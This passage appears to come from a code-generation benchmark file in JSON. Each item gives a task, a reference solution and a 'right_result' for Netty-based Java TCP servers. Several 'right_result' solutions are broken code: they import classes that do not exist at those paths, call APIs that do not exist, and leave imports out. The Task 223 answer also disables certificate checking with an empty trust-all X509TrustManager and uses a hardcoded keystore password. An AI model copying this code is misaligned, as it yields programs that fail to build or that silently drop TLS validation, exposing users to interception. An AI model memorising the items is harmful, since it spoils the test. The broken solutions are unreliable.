    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class FactorialServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContext.newServerContext(ssc.certificate(), ssc.privateKey());\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new FactorialServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.ssl.TrustManager;\nimport io.netty.handler.ssl.TrustManagerFactory;\nimport io.netty.handler.ssl.SSLEngine;\nimport io.netty.handler.ssl.SSLContext;\nimport javax.net.ssl.*;\n\nimport java.security.KeyStore;\nimport java.security.KeyManagerFactory;\nimport java.security.SecureRandom;\n\npublic class FactorialServer {\n    private boolean ssl;\n    private int port;\n\n    public FactorialServer() {\n        this.ssl = Boolean.parseBoolean(System.getProperty(\"ssl\", \"false\"));\n        this.port = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .option(ChannelOption.SO_BACKLOG, 100)\n                     .handler(new LoggingHandler(LogLevel.INFO));\n\n            if (ssl) {\n                SSLContext sslContext = SSLContext.getInstance(\"TLSv1.2\");\n                KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n                keyStore.load(null, null);\n                KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());\n                keyManagerFactory.init(keyStore, null);\n                TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n                trustManagerFactory.init(keyStore);\n                sslContext.init(keyManagerFactory.getKeyManagers(), trustManagerFactory.getTrustManagers(), new SecureRandom());\n                bootstrap.ssl(sslContext);\n            }\n\n            bootstrap.childHandler(new FactorialServerInitializer());\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    static class FactorialServerInitializer extends ChannelInitializer<SocketChannel> {\n        @Override\n        protected void initChannel(SocketChannel ch) throws Exception {\n            ch.pipeline().addLast(new StringDecoder());\n            ch.pipeline().addLast(new StringEncoder());\n            ch.pipeline().addLast(new FactorialServerHandler());\n        }\n    }\n\n    static class FactorialServerHandler extends SimpleChannelInboundHandler<String> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n            System.out.println(\"Received: \" + msg);\n            ctx.writeAndFlush(\"Echo: \" + msg);\n        }\n    }\n}"
  },
  {
    "Task_id": 222,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that can handle custom protocol messages with proper encoding/decoding and processing.\n\nClass Description: ProtocolServer is a Netty-based TCP server implementation that listens on a specified port, handles incoming connections, and processes custom protocol messages using dedicated encoder/decoder and handler components.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nMAX_FRAME_LENGTH: static final int - Maximum allowed frame length for incoming messages (1MB)\nLENGTH_FIELD_LENGTH: static final int - Length of the length field in the protocol (4 bytes)\nLENGTH_FIELD_OFFSET: static final int - Offset of the length field in the protocol (6 bytes)\nLENGTH_ADJUSTMENT: static final int - Adjustment value for the length field (0)\nINITIAL_BYTES_TO_STRIP: static final int - Number of bytes to strip from the beginning of the message (0)\n\nMethods:\nProtocolServer(int port) -> None - Constructor that initializes the server with the specified port number\nrun() -> void - Starts the Netty server, configures the pipeline with protocol handlers, and begins listening for connections (throws Exception)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class ProtocolServer {\n\n    private int port;\n    \n    private static final int MAX_FRAME_LENGTH = 1024 * 1024;\n    private static final int LENGTH_FIELD_LENGTH = 4;\n    private static final int LENGTH_FIELD_OFFSET = 6;\n    private static final int LENGTH_ADJUSTMENT = 0;\n    private static final int INITIAL_BYTES_TO_STRIP = 0;\n    \n    public ProtocolServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"decoder\",\n                            new ProtocolDecoder(MAX_FRAME_LENGTH,\n                                    LENGTH_FIELD_OFFSET,LENGTH_FIELD_LENGTH, \n                                    LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                    ch.pipeline().addLast(\"encoder\", new ProtocolEncoder());\n                    ch.pipeline().addLast(new ProtocolServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start listen at \" + port);\n            f.channel().closeFuture().sync();\n\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap; import io.netty.channel.ChannelFuture; import io.netty.channel.ChannelOption; import io.netty.channel.EventLoopGroup; import io.netty.channel.nio.NioEventLoopGroup; import io.netty.channel.socket.nio.NioServerSocketChannel; import io.netty.handler.codec.LengthFieldBasedFrameDecoder; import io.netty.handler.logging.LogLevel; import io.netty.handler.logging.LoggingHandler; import io.netty.channel.ChannelInitializer; import io.netty.channel.ChannelPipeline; import io.netty.channel.socket.SocketChannel; import io.netty.handler.codec.MessageToByteEncoder; import io.netty.handler.codec.ByteToMessageDecoder; import io.netty.buffer.ByteBuf; import io.netty.channel.SimpleChannelInboundHandler; public class ProtocolServer { private final int port; public static final int MAX_FRAME_LENGTH = 1024 * 1024; public static final int LENGTH_FIELD_LENGTH = 4; public static final int LENGTH_FIELD_OFFSET = 6; public static final int LENGTH_ADJUSTMENT = 0; public static final int INITIAL_BYTES_TO_STRIP = 0; public ProtocolServer(int port) { this.port = port; } public void run() throws Exception { EventLoopGroup bossGroup = new NioEventLoopGroup(); EventLoopGroup workerGroup = new NioEventLoopGroup(); try { ServerBootstrap bootstrap = new ServerBootstrap(); bootstrap.group(bossGroup, workerGroup) .channel(NioServerSocketChannel.class) .option(ChannelOption.SO_BACKLOG, 100) .handler(new LoggingHandler(LogLevel.INFO)) .childHandler(new ChannelInitializer<SocketChannel>() { @Override protected void initChannel(SocketChannel ch) { ChannelPipeline pipeline = ch.pipeline(); pipeline.addLast(new LengthFieldBasedFrameDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_LENGTH, LENGTH_FIELD_OFFSET, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP)); pipeline.addLast(new CustomMessageHandler()); pipeline.addLast(new CustomMessageEncoder()); } }); ChannelFuture future = bootstrap.bind(port).sync(); future.channel().closeFuture().sync(); } finally { workerGroup.shutdownGracefully(); bossGroup.shutdownGracefully(); } } public static class CustomMessageEncoder extends MessageToByteEncoder<String> { @Override protected void encode(ChannelHandlerContext ctx, String msg, ByteBuf out) { out.writeInt(msg.length()); out.writeBytes(msg.getBytes()); } } public static class CustomMessageHandler extends SimpleChannelInboundHandler<String> { @Override protected void channelRead0(ChannelHandlerContext ctx, String msg) { System.out.println(\"Received message: \" + msg); String response = \"Echo: \" + msg; ctx.write(response); } @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) { cause.printStackTrace(); ctx.close(); } } }"
  },
  {
    "Task_id": 223,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling both secure (SSL) and non-secure connections on the same port.\n\nClass Description: PortUnificationServer is a Netty-based TCP server that listens on a specified port and can handle both SSL and plaintext connections through port unification. It uses a boss-worker thread model for efficient connection handling.\n\nAttributes:\nPORT: int - The port number on which the server will listen for incoming connections (default: 8080)\n\nMethods:\nmain: main(String[] args) -> void - The entry point of the application that:\n1. Creates a self-signed SSL certificate for testing\n2. Sets up Netty's event loop groups\n3. Configures the server bootstrap with channel type and handlers\n4. Binds to the specified port and starts the server\n5. Handles graceful shutdown of resources\n\nThe method throws Exception to handle potential errors during server setup and operation.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class PortUnificationServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n\n    public static void main(String[] args) throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        final SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n            .build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(new PortUnificationServerHandler(sslCtx));\n                }\n            });\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.TrustManagerFactory;\nimport io.netty.handler.ssl.SSLHandshakeCompletionEvent;\nimport io.netty.handler.ssl.SslHandler;\nimport java.io.FileOutputStream;\nimport java.io.InputStream;\nimport java.security.KeyPairGenerator;\nimport java.security.KeyStore;\nimport java.security.KeyStoreException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.cert.Certificate;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.Date;\nimport java.util.concurrent.TimeUnit;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class PortUnificationServer {\n    private static final int PORT = 8080;\n\n    public static void main(String[] args) throws Exception {\n        generateSelfSignedCertificate();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new HttpServerCodec());\n                            pipeline.addLast(new MyHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 100)\n                    .childOption(ChannelOption.SO_REUSEADDR, true);\n\n            ChannelFuture future = bootstrap.bind(PORT).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static void generateSelfSignedCertificate() throws Exception {\n        KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"RSA\");\n        kpg.initialize(2048);\n        KeyPair keyPair = kpg.generateKeyPair();\n\n        X509Certificate certificate = createSelfSignedCertificate(keyPair);\n\n        KeyStore keyStore = KeyStore.getInstance(\"JKS\");\n        keyStore.load(null, null);\n        keyStore.setKeyEntry(\"server\", keyPair.getPrivate(), \"password\".toCharArray(), new Certificate[]{certificate});\n\n        try (FileOutputStream fos = new FileOutputStream(\"server.jks\")) {\n            keyStore.store(fos, \"password\".toCharArray());\n        }\n    }\n\n    private static X509Certificate createSelfSignedCertificate(KeyPair keyPair) throws Exception {\n        X509Certificate cert = (X509Certificate) createCert(keyPair);\n        cert.checkValidity();\n        return cert;\n    }\n\n    private static X509Certificate createCert(KeyPair keyPair) throws Exception {\n        CertificateFactory cf = CertificateFactory.getInstance(\"X.509\");\n        X509Certificate cert = (X509Certificate) cf.generateCertificate(\n                new ByteArrayInputStream(\n                        new ASN1Encoder().encode(\n                                new X509v3CertificateBuilder(\n                                        new X509Name(\"CN=localhost\"),\n                                        1000,\n                                        new Date(),\n                                        new Date(System.currentTimeMillis() + 365 * 24 * 60 * 60 * 1000),\n                                        new X509Name(\"CN=localhost\"),\n                                        keyPair.getPublic()\n                                ).build()\n                        )\n                )\n        );\n        return cert;\n    }\n\n    static class MyHandler extends ChannelHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            Channel channel = ctx.channel();\n            if (channel.pipeline().get(SslHandler.class) == null) {\n                SslContext sslContext = SslContextBuilder.forServer(\"server.jks\", \"password\")\n                        .trustManager(new TrustManager[]{new X509TrustManager() {\n                            @Override\n                            public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n                            }\n\n                            @Override\n                            public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {\n                            }\n\n                            @Override\n                            public X509Certificate[] getAcceptedIssuers() {\n                                return new X509Certificate[0];\n                            }\n                        }})\n                        .build();\n                channel.pipeline().addFirst(sslContext.newHandler(channel));\n            }\n            super.channelActive(ctx);\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            System.out.println(\"Received: \" + msg);\n            ctx.writeAndFlush(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 226,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle HTTP requests, with configurable bind address and port, and proper resource management for startup and shutdown.\n\nClass Description: WebConfigContainer is a container class that manages the lifecycle of a Netty-based HTTP server. It initializes and configures the server components, starts the server on a specified port, and provides graceful shutdown capabilities.\n\nAttributes:\n- serverWorkerGroup: [NioEventLoopGroup] - Worker thread group for handling I/O operations\n- serverBossGroup: [NioEventLoopGroup] - Boss thread group for accepting incoming connections\n- logger: [Logger] - SLF4J logger instance for logging server events\n\nMethods:\n- WebConfigContainer() -> [void] - Constructor that initializes the boss and worker event loop groups\n- start() -> [void] - Starts the HTTP server by configuring ServerBootstrap, setting up the channel pipeline with HTTP handlers, and binding to the configured port\n- stop() -> [void] - Gracefully shuts down the server by closing the event loop groups and releasing all resources",
    "Canonical_solution": "import org.fengfei.lanproxy.common.container.Container;\nimport org.fengfei.lanproxy.server.config.ProxyConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\npublic class WebConfigContainer implements Container {\n\n    private static Logger logger = LoggerFactory.getLogger(WebConfigContainer.class);\n\n    private NioEventLoopGroup serverWorkerGroup;\n    private NioEventLoopGroup serverBossGroup;\n\n    public WebConfigContainer() {\n        serverBossGroup = new NioEventLoopGroup(1);\n        serverWorkerGroup = new NioEventLoopGroup(1);\n    }\n\n    @Override\n    public void start() {\n        ServerBootstrap httpServerBootstrap = new ServerBootstrap();\n        httpServerBootstrap.group(serverBossGroup, serverWorkerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline pipeline = ch.pipeline();\n                    pipeline.addLast(new HttpServerCodec());\n                    pipeline.addLast(new HttpObjectAggregator(8 * 1024 * 1024));\n                    pipeline.addLast(new ChunkedWriteHandler());\n                    pipeline.addLast(new HttpRequestHandler());\n                }\n            });\n\n        try {\n            httpServerBootstrap.bind(ProxyConfig.getInstance().getConfigServerBind(),\n                    ProxyConfig.getInstance().getConfigServerPort()).get();\n            logger.info(\"http server start on port \" + ProxyConfig.getInstance().getConfigServerPort());\n        } catch (Exception ex) {\n            throw new RuntimeException(ex);\n        }\n    }\n\n    @Override\n    public void stop() {\n        serverBossGroup.shutdownGracefully();\n        serverWorkerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class WebConfigContainer {\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final Logger logger = LoggerFactory.getLogger(WebConfigContainer.class);\n    private String host;\n    private int port;\n\n    public WebConfigContainer(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new HttpServerCodec());\n                        pipeline.addLast(new HttpObjectAggregator());\n                    }\n                })\n                .bind(host, port).syncUninterruptibly();\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 228,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and echo back received messages.\n\nClass Description: The EchoServer class is a Netty-based TCP server that listens on a specified port, accepts client connections, and echoes back any received messages. It uses Netty's event-driven architecture for efficient network communication.\n\nAttributes:\n- port: int - The port number on which the server will listen for incoming connections\n\nMethods:\n- EchoServer(int port) -> Constructor - Initializes the server with the specified port number\n- start() -> void - Starts the server, binds to the specified port, and begins accepting connections. Handles server shutdown gracefully when stopped. Throws Exception if any error occurs during startup or operation",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class EchoServer {\n    private final int port;\n\n    public EchoServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        final EchoServerHandler serverHandler = new EchoServerHandler();\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b = b.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(port))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(serverHandler);\n                        }\n                    });\n            ChannelFuture f = b.bind().sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully().sync();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "import io.netty.bootstrap.ServerBootstrap;  \nimport io.netty.channel.Channel;  \nimport io.netty.channel.ChannelFuture;  \nimport io.netty.channel.ChannelInitializer;  \nimport io.netty.channel.ChannelOption;  \nimport io.netty.channel.EventLoopGroup;  \nimport io.netty.channel.nio.NioEventLoopGroup;  \nimport io.netty.channel.socket.SocketChannel;  \nimport io.netty.channel.socket.nio.NioServerSocketChannel;  \nimport io.netty.handler.codec.string.StringDecoder;  \nimport io.netty.handler.codec.string.StringEncoder;  \nimport io.netty.handler.logging.LogLevel;  \nimport io.netty.handler.logging.LoggingHandler;  \nimport io.netty.util.CharsetUtil;  \n\npublic class EchoServer {  \n    private final int port;  \n\n    public EchoServer(int port) {  \n        this.port = port;  \n    }  \n\n    public void start() throws Exception {  \n        EventLoopGroup bossGroup = new NioEventLoopGroup();  \n        EventLoopGroup workerGroup = new NioEventLoopGroup();  \n\n        try {  \n            ServerBootstrap bootstrap = new ServerBootstrap();  \n            bootstrap.group(bossGroup, workerGroup)  \n                     .channel(NioServerSocketChannel.class)  \n                     .option(ChannelOption.SO_REUSEADDR, true)  \n                     .childOption(ChannelOption.SO_KEEPALIVE, true)  \n                     .handler(new LoggingHandler(LogLevel.INFO))  \n                     .childHandler(new ChannelInitializer<SocketChannel>() {  \n                         @Override  \n                         protected void initChannel(SocketChannel ch) {  \n                             ch.pipeline().addLast(new StringDecoder(CharsetUtil.UTF_8), new StringEncoder(CharsetUtil.UTF_8), new EchoHandler());  \n                         }  \n                     });  \n\n            ChannelFuture future = bootstrap.bind(port).sync();  \n\n            future.channel().closeFuture().sync();  \n        } finally {  \n            bossGroup.shutdownGracefully();  \n            workerGroup.shutdownGracefully();  \n        }  \n    }  \n\n    private static class EchoHandler extends io.netty.channel.ChannelInboundHandlerAdapter {  \n        @Override  \n        public void channelRead(ChannelHandlerContext ctx, Object msg) {  \n            ctx.write(msg);  \n            ctx.flush();  \n        }  \n\n        @Override  \n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {  \n            cause.printStackTrace();  \n            ctx.close();  \n        }  \n    }  \n}"
  },
  {
    "Task_id": 229,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle proxy server functionality, including SSL/TLS support, message encoding/decoding, and idle connection management.\n\nClass Description: ProxyServerContainer is a Netty-based TCP server container that manages proxy server operations. It handles client connections, processes proxy messages, and manages server resources. The class includes SSL/TLS support, custom message handlers, and graceful shutdown capabilities.\n\nAttributes:\n- serverWorkerGroup: [NioEventLoopGroup] - Handles I/O operations and other tasks for accepted connections\n- serverBossGroup: [NioEventLoopGroup] - Accepts incoming connections and assigns them to worker group\n- logger: [Logger] - SLF4J logger instance for logging server events and errors\n\nMethods:\n- ProxyServerContainer() -> [void] - Constructor that initializes the event loop groups\n- start() -> [void] - Starts the proxy server by binding to configured host/port and setting up channel pipeline\n- stop() -> [void] - Shuts down the server gracefully by releasing all resources\n- createSslHandler(SSLContext sslContext, boolean needsClientAuth) -> [ChannelHandler] - Creates SSL handler for secure communication (input: SSLContext for security configuration, boolean for client auth requirement; output: configured SSL handler)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.ssl.SslHandler;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLEngine;\nimport org.fengfei.lanproxy.server.config.ProxyConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class ProxyServerContainer {\n\n    private static final Logger logger = LoggerFactory.getLogger(ProxyServerContainer.class);\n\n    private NioEventLoopGroup serverWorkerGroup;\n    private NioEventLoopGroup serverBossGroup;\n\n    public ProxyServerContainer() {\n        serverBossGroup = new NioEventLoopGroup();\n        serverWorkerGroup = new NioEventLoopGroup();\n    }\n\n    public void start() {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(serverBossGroup, serverWorkerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new ProxyMessageDecoder(MAX_FRAME_LENGTH, LENGTH_FIELD_OFFSET, \n                                LENGTH_FIELD_LENGTH, LENGTH_ADJUSTMENT, INITIAL_BYTES_TO_STRIP));\n                        pipeline.addLast(new ProxyMessageEncoder());\n                        pipeline.addLast(new IdleCheckHandler(IdleCheckHandler.READ_IDLE_TIME, \n                                IdleCheckHandler.WRITE_IDLE_TIME, 0));\n                        pipeline.addLast(new ServerChannelHandler());\n                    }\n                });\n\n        try {\n            ChannelFuture future = bootstrap.bind(ProxyConfig.getInstance().getServerBind(), \n                    ProxyConfig.getInstance().getServerPort()).sync();\n            logger.info(\"proxy server start on port \" + ProxyConfig.getInstance().getServerPort());\n        } catch (InterruptedException ex) {\n            throw new RuntimeException(ex);\n        }\n    }\n\n    private ChannelHandler createSslHandler(SSLContext sslContext, boolean needsClientAuth) {\n        SSLEngine sslEngine = sslContext.createSSLEngine();\n        sslEngine.setUseClientMode(false);\n        if (needsClientAuth) {\n            sslEngine.setNeedClientAuth(true);\n        }\n        return new SslHandler(sslEngine);\n    }\n\n    public void stop() {\n        serverBossGroup.shutdownGracefully();\n        serverWorkerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
